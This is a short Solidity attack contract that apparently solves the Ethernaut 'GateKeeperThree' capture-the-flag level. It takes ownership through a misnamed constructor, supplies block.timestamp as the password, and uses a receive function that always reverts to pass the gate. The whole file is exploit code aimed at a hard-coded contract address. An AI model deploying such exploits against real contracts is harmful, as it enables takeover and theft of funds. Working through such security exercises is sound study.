// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGateKeeperThree {
    function construct0r() external;
    function enter() external;
    function createTrick() external;
    
    function getAllowance(uint _password) external;
}


contract GateKeeperThreeAttack {
    
    IGateKeeperThree public gateKeeperThree = IGateKeeperThree(0x9Ea35f4bAD915f7FC4f553B0e9e4541c5c0697Fd);
    
    function callMe() external {

        gateKeeperThree.construct0r();
        
        
        gateKeeperThree.createTrick();
        gateKeeperThree.getAllowance(block.timestamp);
        

        gateKeeperThree.enter();

    }
    receive() external payable {
        require(false, "boo hoo");
    }

}